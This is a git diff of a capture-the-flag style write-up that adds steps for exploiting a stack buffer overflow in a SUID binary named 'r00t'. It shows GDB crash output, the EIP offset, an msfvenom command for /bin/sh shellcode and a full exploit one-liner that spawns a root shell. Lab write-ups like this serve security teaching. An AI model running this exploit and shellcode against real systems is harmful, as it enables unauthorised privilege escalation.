@@ -142,18 +142,19 @@ find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null
 ./r00t  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault
 ```
-- we can download the bianry and examine it at our kali box 
 
-```bash
-scp -i noob noob@192.168.80.138:/nothing_to_see_here/choose_wisely/door2/r00t r00t
-```
-
-**Exploiting Buffer over flow [using EDB]**
+**Exploiting Buffer over flow [using GDB]**
 
 - trying until length=300 the binary returns segmentation fault and the EIP is overwritten 
-
-![image](https://user-images.githubusercontent.com/67979878/186060572-36e4562f-72de-496f-b24d-eb5c7cccccb9.png)
-
+```bash
+(gdb) r $(python -c 'print("A"*300)')
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info registers 
+...
+eip            0x41414141	0x41414141
+....
+```
 - now we want to get the **offset** until the EIP is overwritten :
 
 ```bash
@@ -164,10 +165,29 @@ msf-pattern_offset -q 6a413969 -l 300
 ```
 - confirm results :
 ```bash
- python3 -c 'print("A"*268+"BBBB")'
+(gdb) r $(python -c 'print("A"*268+"BBBB")')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
  ```
- Sending this output in EDB we got EIP=42424242 , so confirmed 
+ Sending this output in EDB we got EIP=42424242 , so confirmed we can control the EIP
 
-- we want to get the JMP ESP instruction address so we can inject our shellcode at 
+- we want to get the JMP ESP instruction address so we can inject our shellcode at , but we can find no `JMP ESP` instruction 
+- we can write our shellcode and hope there are any instruction that can lead for the execution latter 
 
-## Privilege esclation
+```bash
+(gdb) info registers esp
+esp            0xbffffb30	0xbffffb30
+```
+- generate shellcode for shell spawning :
+```bash
+msfvenom -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d'
+```
+- add nop sled 16 leads to Ilegal instruction error , keep increasing until worked
+```bash
+./r00t $(python -c 'print("A"*268+"\x30\xfb\xff\xbf"+"\x90"*128 +"\xda\xdb\xd9\x74\x24\xf4\x5d\x33\xc9\xba\xaf\x19\xcd\xda\xb1\x0b\x31\x55\x1a\x03\x55\x1a\x83\xed\xfc\xe2\x5a\x73\xc6\x82\x3d\xd6\xbe\x5a\x10\xb4\xb7\x7c\x02\x15\xbb\xea\xd2\x01\x14\x89\xbb\xbf\xe3\xae\x69\xa8\xfc\x30\x8d\x28\xd2\x52\xe4\x46\x03\xe0\x9e\x96\x0c\x55\xd7\x76\x7f\xd9")')
+```
+- running it has spawned shell as root user
+
+
+
